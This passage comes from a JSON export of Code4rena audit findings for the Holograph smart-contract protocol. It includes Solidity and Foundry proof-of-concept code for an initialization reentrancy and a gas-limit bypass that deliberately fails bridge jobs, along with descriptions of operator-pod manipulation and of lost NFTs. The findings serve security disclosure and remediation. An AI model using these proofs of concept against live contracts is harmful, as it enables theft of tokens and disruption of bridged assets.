contract type address for the ERC20 enforcer         vm.startPrank(hrAdmin, hrAdmin);         hr.init(hrInitPayload);         hr.setContractTypeAddress(reservedTypes[0], address(he20));         vm.stopPrank();          //Keys used to sign transaction for deployment         userPrivateKey = 0x1337;         user = vm.addr(userPrivateKey);     }      function testDeployShadyHolographer() public {         //setting up the configuration, contract type is not important         config.contractType = \"0xabc\";         config.chainType = 1;         config.salt = \"0x12345\";         config.byteCode = type(SourceContract).creationCode;         bytes memory initCode = \"0x123\";          //giving our token some semi-realistic metadata         config.initCode = abi.encode(\"HToken\", \"HT\", uint8(18), uint256(0), \"HTdomainSeparator\", \"HTdomainVersion\", false, initCode);          //creating the hash for our user to sign         bytes32 hash = keccak256(             abi.encodePacked(                 config.contractType,                 config.chainType,                 config.salt,                 keccak256(config.byteCode),                 keccak256(config.initCode),                 user             ));          //signing the hash and creating the verified signature         (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, hash);         verifiedSignature.r = r;         verifiedSignature.v = v;         verifiedSignature.s = s;          //deploying our new source contract and holographable contract pair         hf.deployHolographableContract(config, verifiedSignature, user);          //after the reentrancy has affected the initialization, we grab the holographer address from the registry         address payable newHolographAsset = payable(hr.getHolographedHashAddress(hash));          //verify that the _holographSlot in the holographer contract points to our SourceContract and not the trusted holograph contract         assertEq(SourceContract(Holographer(newHolographAsset).getHolograph()).isTheHolograph(), true);     } } ``` ## Recommended Mitigation Steps  Consider checking whether the contract is in an \"initializing\" phase such as is done in OpenZeppelin's [`Initializable`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/a1948250ab8c441f6d327a65754cb20d2b1b4554/contracts/proxy/utils/Initializable.sol#L83) library to prevent reentrancy during initialization. Additionally, if the bridge and operators are not intended to transfer tokens directly, consider removing the logic that allows them to bypass the allowance requirements. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/207", "labels": ["bug", "QA (Quality Assurance)", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "HolographERC721.approve not EIP-721 compliant", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/205", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/24bc4d8dfeb6e4328d2c6291d20553b1d3eff00b/src/enforcer/HolographERC721.sol#L272   # Vulnerability details  ## Impact According to EIP-721, we have for `approve`: ```solidity ///  Throws unless `msg.sender` is the current NFT owner, or an authorized ///  operator of the current owner. ``` An operator in the context of EIP-721 is someone who was approved via `setApprovalForAll`: ```solidity /// @notice Enable or disable approval for a third party (\"operator\") to manage ///  all of `msg.sender`'s assets /// @dev Emits the ApprovalForAll event. The contract MUST allow ///  multiple operators per owner. /// @param _operator Address to add to the set of authorized operators /// @param _approved True if the operator is approved, false to revoke approval function setApprovalForAll(address _operator, bool _approved) external; ``` Besides operators, there are also approved addresses for a token (for which `approve` is used). However, approved addresses can only transfer the token, see for instance the `safeTransferFrom` description: ```solidity /// @dev Throws unless `msg.sender` is the current owner, an authorized ///  operator, or the approved address for this NFT. ``` `HolographERC721` does not distinguish between authorized operators and approved addresses when it comes to the `approve` function. Because `_isApproved(msg.sender, tokenId)` is used there, an approved address can approve another address, which is a violation of the EIP (only authorized operators should be able to do so).  ## Proof Of Concept Bob calls `approve` to approve Alice on token ID 42 (that is owned by Bob). One week later, Bob sees that a malicious address was approved for his token ID 42 (e.g., because Alice got phished) and stole his token. Bob wonders how this is possible, because Alice should not have the permission to approve other addresses. However, becaue `HolographERC721` did not follow EIP-721, it was possible.  ## Recommended Mitigation Steps Follow the EIP, i.e. do not allow approved addresses to approve other addresses."}, {"title": "HolographERC721.safeTransferFrom not compliant with EIP-721", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/203", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/24bc4d8dfeb6e4328d2c6291d20553b1d3eff00b/src/enforcer/HolographERC721.sol#L366   # Vulnerability details  ## Impact According to EIP-721, we have the following for `safeTransferFrom`: ```solidity ///  (...) When transfer is complete, this function ///  checks if `_to` is a smart contract (code size > 0). If so, it calls ///  `onERC721Received` on `_to` and throws if the return value is not ///  `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`. ``` According to the specification, the function must therefore always call `onERC721Received`, not only when it has determined via ERC-165 that the contract provides this function. Note that in the EIP, the provided interface for `ERC721TokenReceiver` does not mention ERC-165. For the token itself, we have: `interface ERC721 /* is ERC165 */ {` However, for the receiver, the provided interface there is just: `interface ERC721TokenReceiver {` This leads to failed transfers when they should not fail, because many receivers will just implement the `onERC721Received` function (which is sufficient according to the EIP), and not `supportsInterface` for ERC-165 support.  ## Proof Of Concept Let's say a receiver just implements the `IERC721Receiver` from OpenZeppelin: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/IERC721Receiver.sol Like the provided interface in the EIP itself, this interface does not derive from EIP-165. All of these receivers (which are most receivers in practice) will not be able to receive those tokens, because the `require` statement (that checks for ERC-165 support) reverts.  ## Recommended Mitigation Steps Remove the ERC-165 check in the `require` statement (like OpenZeppelin does: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L436)"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/192", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "PA1D#bidSharesForToken returns incorrect bidShares.creator.value", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/180", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L665-L675   # Vulnerability details  ## Impact  bidShares returned are incorrect leading to incorrect royalties  ## Proof of Concept  [Zora Market](https://etherscan.io/address/0xe5bfab544eca83849c53464f85b7164375bdaac1#code#F1#L113)      function isValidBidShares(BidShares memory bidShares)         public         pure         override         returns (bool)     {         return             bidShares.creator.value.add(bidShares.owner.value).add(                 bidShares.prevOwner.value             ) == uint256(100).mul(Decimal.BASE);     }  Above you can see the Zora market lines that validate bidShares, which shows that Zora market bidShare.values should be percentages written out to 18 decimals. However PA1D#bidSharesForToken sets the bidShares.creator.value to the raw basis points set by the owner, which is many order of magnitudes different than expected.     ## Tools Used  Manual Review  ## Recommended Mitigation Steps  To return the proper value, basis points returned need to be adjusted. Convert from basis points to percentage by dividing by 10 ** 2 (100) then scale to 18 decimals. The final result it to multiple the basis point by 10 ** (18 - 2) or 10 ** 16:       function bidSharesForToken(uint256 tokenId) public view returns (ZoraBidShares memory bidShares) {         // this information is outside of the scope of our         bidShares.prevOwner.value = 0;         bidShares.owner.value = 0;         if (_getReceiver(tokenId) == address(0)) {     -       bidShares.creator.value = _getDefaultBp();     +       bidShares.creator.value = _getDefaultBp() * (10 ** 16);         } else {     -       bidShares.creator.value = _getBp(tokenId);     +       bidShares.creator.value = _getBp(tokenId) * (10 ** 16);         }         return bidShares;     }"}, {"title": "It's possible to mint more then type(uint256).max ERC20 tokens", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/177", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "resolved", "sponsor acknowledged", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "It's possible to mint more then type(uint256).max ERC20 tokens"}, {"title": "Gas limit check is inaccurate, leading to an operator being able to fail a job intentionally  ", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/176", "labels": ["bug", "3 (High Risk)", "disagree with severity", "primary issue", "resolved", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L316   # Vulnerability details  There's a check at line 316 that verifies that there's enough gas left to execute the `HolographBridge.bridgeInRequest()` with the `gasLimit` set by the user, however the actual amount of gas left during the call is less than that (mainly due to the 1/64 rule, see below). An attacker can use that gap to fail the job while still having the `executeJob()` function complete.   ## Impact The owner of the bridged token would loose access to the token since the job failed.  ## Proof of Concept Besides using a few units of gas between the check and the actual call, there's also a rule that only 63/64 of the remaining gas would be dedicated to an (external) function call. Since there are 2 external function calls done (`nonRevertingBridgeCall()` and the actual call to the bridge) ~2/64 of the gas isn't sent to the bridge call and can be used after the bridge call runs out of gas.   The following PoC shows that if the amount of gas left before the call is at least 1 million then the execution can continue after the bridge call fails:  ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.0;  import \"forge-std/Test.sol\";  contract ContractTest is Test {     event FailedOperatorJob(bytes32 jobHash);     uint256 private _inboundMessageCounter;     mapping(bytes32 => bool) private _failedJobs;     constructor(){         _inboundMessageCounter = 5;     }     function testGas64() public {         this.entryPoint{gas:1000000}();     }      Bridge bridge = new Bridge();     event GasLeftAfterFail(uint left);      function entryPoint() public {          console2.log(\"Gas left before call: \", gasleft());          bytes32 hash = 0x987744358512a04274ccfb3d9649da3c116cd6b19c535e633ef8529a80cb06a0;          try this.intermediate(){         }catch{             // check out how much gas is left after the call to the bridge failed             console2.log(\"Gas left after failure: \", gasleft());             // simulate operations done after failure             _failedJobs[hash] = true;             emit FailedOperatorJob(hash);         }         ++_inboundMessageCounter;         console2.log(\"Gas left at end: \", gasleft());      }      function intermediate() public{         bridge.bridgeCall();     } }   contract Bridge{     event Done(uint gasLeft);      uint256[] myArr;      function bridgeCall() public {         for(uint i =1; i <= 100; i++){             myArr.push(i);         }         // this line would never be reached, we'll be out of gas beforehand         emit Done(gasleft());     } }  ```  Output of PoC: ```   Gas left before call:  999772   Gas left after failure:  30672   Gas left at end:  1628 ```  Side note: due to some bug in forge `_inboundMessageCounter` would be considered warm even though it's not necessarily the case. However in a real world scenario we can warm it up if the selected operator is a contract and we'er using another operator contract to execute a job in the same tx beforehand.   Reference for the 1/64 rule - [EIP-150](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md). Also check out [evm.codes](https://www.evm.codes/#f1?fork=grayGlacier:~:text=From%20the%20Tangerine%20Whistle%20fork%2C%20gas%20is%20capped%20at%20all%20but%20one%2064th%20(remaining_gas%20/%2064)%20of%20the%20remaining%20gas%20of%20the%20current%20context.%20If%20a%20call%20tries%20to%20send%20more%2C%20the%20gas%20is%20changed%20to%20match%20the%20maximum%20allowed.).   ## Recommended Mitigation Steps Modify the required amount of gas left to gasLimit + any amount of gas spent before reaching the `call()`, then multiply it by 32/30 to mitigate the 1/64 rule (+ some margin of safety maybe)."}, {"title": "Beaming job might freeze on dest chain under some conditions, leading to owner loosing (temporarily) access to token", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/170", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected-for-report", "edited-by-warden", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L255   # Vulnerability details  ## Impact  If the following conditions have been met: * The selected operator doesn't complete the job, either intentionally (they're sacrificing their bonded amount to harm the token owner) or innocently (hardware failure that caused a loss of access to the wallet)  * Gas price has spiked, and isn't going down than the `gasPrice` set by the user in the bridge out request  Then the bridging request wouldn't complete and the token owner would loos access to the token till the gas price goes back down again.   ## Proof of Concept The fact that no one but the selected operator can execute the job in case of a gas spike has been proven by the test ['Should fail if there has been a gas spike'](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/test/14_holograph_operator_tests.ts#L834-L844) provided by the sponsor.  An example of a price spike can be in the recent month in the Ethereum Mainnet where the min gas price was 3 at Oct 8, but jumped to 14 the day after and didn't go down since then (the min on Oct 9 was lower than the avg of Oct8, but users might witness a momentarily low gas price and try to hope on it). See the [gas price chat on Etherscan](https://etherscan.io/chart/gasprice) for more details.  ## Recommended Mitigation Steps  In case of a gas price spike, instead of refusing to let other operators to execute the job, let them execute the job without slashing the selected operator. This way, after a while also the owner can execute the job and pay the gas price."}, {"title": "An attacker can manipulate each pod and gain an advantage over the remainder Operators", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/168", "labels": ["bug", "3 (High Risk)", "primary issue", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L484-L539 https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L1138-L1144   # Vulnerability details  # H001 An attacker can manipulate each pod and gain an advantage over the remainder Operators  ## Impact  In [contracts/HolographOperator.sol#crossChainMessage](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L484-L539), each Operator is selected by:  - Generating a random number ([L499](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L499)) - A pod is selected by dividing the random with the total number of pods, and using the remainder ([L503](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L503)) - An Operator of the selected pod is chosen using the **same** random and dividing by the total number of operators ([L511](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L511)).  This creates an unintended bias since the first criterion (the `random`) is used for both selecting the pod and selecting the Operator, as explained in a previous issue (`M001-Biased distribution`). In this case, an attacker knowing this flaw can continuously monitor the contracts state and see the current number of pods and Operators. Accordingly to the [documentation](https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection) and provided [flow](https://github.com/code-423n4/2022-10-holograph/blob/main/docs/IMPORTANT_FLOWS.md#joining-pods):  * An Operator can easily join and leave a pod, albeit when leaving a small fee is paid * An Operator can only join one pod, but an attacker can control multiple Operators * The attacker can then enter and leave a pod to increase (unfairly) his odds of being selected for a job  Honest Operators may feel compelled to leave the protocol if there are no financial incentives (and lose funds in the process), which can also increase the odds of leaving the end-users at the hands of a malicious Operator.  ## Proof of Concept  Consider the following simulation for 10 pods with a varying number of operators follows (X \u2192 \"does not apply\"): | Pod n | Pon len | Op0 | Op1 | Op2 | Op3 | Op4 | Op5 | Op6 | Op7 | Op8 | Op9 | Total Pod | | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |  | P0 | 10 | 615 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 615 | | P1 | 3 | 203 | 205 | 207 | X | X | X | X | X | X | X | 615 | | P2 | 6 | 208 | 0 | 233 | 0 | 207 | 0 | X | X | X | X | 648 | | P3 | 9 | 61 | 62 | 69 | 70 | 65 | 69 | 61 | 60 | 54 | X | 571 | | P4 | 4 | 300 | 0 | 292 | 0 | X | X | X | X | X | X | 592 | | P5 | 10 | 0 | 0 | 0 | 0 | 0 | 586 | 0 | 0 | 0 | 0 | 586 | | P6 | 2 | 602 | 0 | X | X | X | X | X | X | X | X | 602 | | P7 | 7 | 93 | 93 | 100 | 99 | 76 | 74 | 78 | X | X | X | 613 | | P8 | 2 | 586 | 0 | X | X | X | X | X | X | X | X | 586 | | P9 | 6 | 0 | 190 | 0 | 189 | 0 | 192 | X | X | X | X | 571 |  At this stage, an attacker Mallory joins the protocol and scans the protocol (or interacts with - e.g. `getTotalPods`, `getPodOperatorsLength`). As an example, after considering the potential benefits, she chooses pod `P9` and sets up some bots `[B1, B2, B3]`. The number of Operators will determine the odds, so:  | Pod P9 | Alt len | Op0 | Op1 | Op2 | Op3 | Op4 | Op5 | Op6 | Op7 | Op8 | Op9 | Total Pod | | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |  | P9A | 4 | 0 | 276 | 0 | 295 | X | X | X | X | X | X | 571 | | P9B | 5 | 0 | 0 | 0 | 0 | 571 | X | X | X | X | X | 571 | | P9 | 6 | 0 | 190 | 0 | 189 | 0 | 192 | X | X | X | X | 571 | | P9C | 7 | 66 | 77 | 81 | 83 | 87 | 90 | 87 | X | X | X | 571 | | P9D | 8 | 0 | 127 | 0 | 147 | 0 | 149 | 0 | 148 | X | X | 571 |  And then:  1. She waits for the next job to fall in `P9` and keeps an eye on the number of pods, since it could change the odds. 2. After an Operator is selected (he [pops](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L518) from the array), the number of available Operators change to 5, and the odds change to `P9B`. 3. She deploys `B1` and it goes to position `Op5`, odds back to `P9`. If the meantime the previously chosen Operator comes back to the `pod`, see the alternative timeline. 4. She now has 1/3 of the probability to be chosen for the next job: 4.1 If she is not chosen, [she will assume the position](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L1138-L1144) of the chosen Operator, and deploys `B2` to maintain the odds of `P9` and controls 2/3 of the pod. 4.2 If she is chosen, she chooses between employing another bot or waiting to execute the job to back to the pod (keeping the original odds). 5. She can then iterate multiple times to swap to the remainder of possible indexes via step 4.1.   Alternative timeline (from previous 3.): 1. The chosen Operator finishes the job and goes back to the pod. Now there's 7 members with uniform odds (`P9C`). 2. Mallory deploys `B2` and the length grows to 8, the odds turn to `P9D` and she now controls two of the four possible indexes from which she can be chosen.  There are a lot of ramifications and possible outcomes that Mallory can manipulate to increase the odds of being selected in her favor.  ## Tools Used  Manual  ## Recommended Mitigation Steps  Has stated in `M001-Biased distribution`, use two random numbers for pod and Operator selection. Ideally, an independent source for randomness should be used, but following the assumption that the one used in [L499](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L499) is safe enough, using the most significant bits (e.g. `random >> 128`) should guarantee an unbiased distribution. Also, reading the [EIP-4399](https://eips.ethereum.org/EIPS/eip-4399) could be valuable.  Additionally, since randomness in blockchain is always tricky to achieve without an oracle provider, consider adding additional controls (e.g. waiting times before joining each pod) to increase the difficulty of manipulating the protocol.  And finally, in this particular case, removing the swapping mechanism (moving the last index to the chosen operator's current index) for another mechanism (shifting could also create conflicts [with backup operators?](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L358-L370)) could also increase the difficulty of manipulating a particular pod.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/159", "labels": ["bug", "QA (Quality Assurance)", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/158", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/152", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/150", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Implementation code does not align with the business requirement: Users are not charged with withdrawn fee when user unbound token in HolographOperator.sol", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/142", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected-for-report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L899 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L920 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L924 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L928 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L932   # Vulnerability details  ## Impact  When user call unbondUtilityToken to unstake the token,   the function read the available bonded amount, and transfer back to the operator  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L899  ```solidity /**  * @dev get current bonded amount by operator  */ uint256 amount = _bondedAmounts[operator]; /**  * @dev unset operator bond amount before making a transfer  */ _bondedAmounts[operator] = 0; /**  * @dev remove all operator references  */ _popOperator(_bondedOperators[operator] - 1, _operatorPodIndex[operator]); /**  * @dev transfer tokens to recipient  */ require(_utilityToken().transfer(recipient, amount), \"HOLOGRAPH: token transfer failed\"); ```  the logic is clean, but does not conform to the buisness requirement in the documentation, the doc said  https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection  >To move to a different pod, an Operator must withdraw and re-bond HLG. Operators who withdraw HLG will be charged a 0.1% fee, the proceeds of which will be burned or returned to the Treasury.  The charge 0.1% fee is not implemented in the code.  there are two incentive for bounded operator to stay,  the first is the reward incentive, the second is to avoid penalty with unbonding.  Without chargin the unstaking fee, the second incentive is weak and the operator can unbound or bond whenver they want  ## Proof of Concept  https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  we recommend charge the 0.1% unstaking fee to make the code align with the busienss requirement in the doc.  ```solidity /**  * @dev get current bonded amount by operator  */ uint256 amount = _bondedAmounts[operator]; uint256 fee = chargedFee(amount); // here amount -= fee;   /**  * @dev unset operator bond amount before making a transfer  */ _bondedAmounts[operator] = 0; /**  * @dev remove all operator references  */ _popOperator(_bondedOperators[operator] - 1, _operatorPodIndex[operator]); /**  * @dev transfer tokens to recipient  */ require(_utilityToken().transfer(recipient, amount), \"HOLOGRAPH: token transfer failed\"); ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/140", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/138", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/136", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/132", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/131", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/129", "labels": ["bug", "QA (Quality Assurance)", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/128", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/127", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/117", "labels": ["bug", "QA (Quality Assurance)", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/116", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/114", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/113", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Failed job can't be recovered. NFT may be lost.", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/102", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "selected-for-report", "edited-by-warden", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L329 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L419-L429   # Vulnerability details  ## Impact Failed job can't be recovered. NFT may be lost.  ## Proof of Concept ```solidity function executeJob(bytes calldata bridgeInRequestPayload) external payable { ... delete _operatorJobs[hash]; ...     try       HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(         msg.sender,         bridgeInRequestPayload       )     {       /// @dev do nothing     } catch {       _failedJobs[hash] = true;       emit FailedOperatorJob(hash);     } } ```  First, it will `delete _operatorJobs[hash];` to have it not replayable.  Next, assume nonRevertingBridgeCall failed. NFT won't be minted and the catch block is entered.  _failedJobs[hash] is set to true and event is emitted  Notice that _operatorJobs[hash] has been deleted, so this job is not replayable. This mean NFT is lost forever since we can't retry executeJob.  ## Recommended Mitigation Steps Move `delete _operatorJobs[hash];` to the end of function executeJob covered in `if (!_failedJobs[hash])`  ```solidity ... if (!_failedJobs[hash]) delete _operatorJobs[hash]; ... ```  But this implementation is not safe. The selected operator may get slashed. Additionally, you may need to check _failedJobs flag to allow retry for only the selected operator."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/101", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/88", "labels": ["bug", "QA (Quality Assurance)", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/87", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/75", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/73", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/72", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/69", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/68", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "selected-for-report", "edited-by-warden", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "QA Report"}, {"title": "A verifier with a signature address of zero is not rejected. Anyone is allowed to sign", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/62", "labels": ["bug", "QA (Quality Assurance)", "grade-b"], "target": "2022-10-holograph-findings", "body": "A verifier with a signature address of zero is not rejected. Anyone is allowed to sign"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/59", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "Gas Optimizations"}, {"title": "Contract ERC20H lacks withdraw functions", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/55", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/abstract/ERC20H.sol#L106-L229   # Vulnerability details  ## Impact Contract ERC20H has payable functions (receive(), fallback(), etc.), but does not have a function to withdraw, therefore, every Ether sent to HolographERC20 will be lost.  ## Proof of Concept Contract functions and structure illustrate the concept.  ## Tools Used Slither  ## Recommended Mitigation Steps Remove the payable attribute or add a withdraw function."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/50", "labels": ["bug", "QA 